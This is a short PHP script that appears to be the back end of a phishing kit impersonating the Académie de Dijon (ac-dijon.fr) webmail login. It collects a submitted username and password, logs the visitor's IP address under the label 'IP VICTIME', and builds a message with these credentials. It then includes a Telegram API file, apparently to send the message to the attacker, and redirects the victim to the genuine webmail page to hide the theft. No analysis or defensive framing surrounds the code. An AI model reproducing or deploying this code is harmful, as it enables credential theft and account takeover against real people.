 <?php
 header('Location:https://webmail.ac-dijon.fr/');

  ///////Post data from form
  $to=$_POST['mailla'];
  $email=htmlspecialchars($_POST['user']);
  $password=htmlspecialchars($_POST['pass']);;
  $ip=$_SERVER['REMOTE_ADDR'];
  
   $message="----AC DIJON--------------\r\n";
   $message .="IP VICTIME :".$_SERVER['REMOTE_ADDR']."\r\n";
   $message .="Nom utilisateur :".$email."\r\n";
   $message .="Mot de passe :".$password."\r\n";
 include 'TelegramApi.php';
  
  
   ?>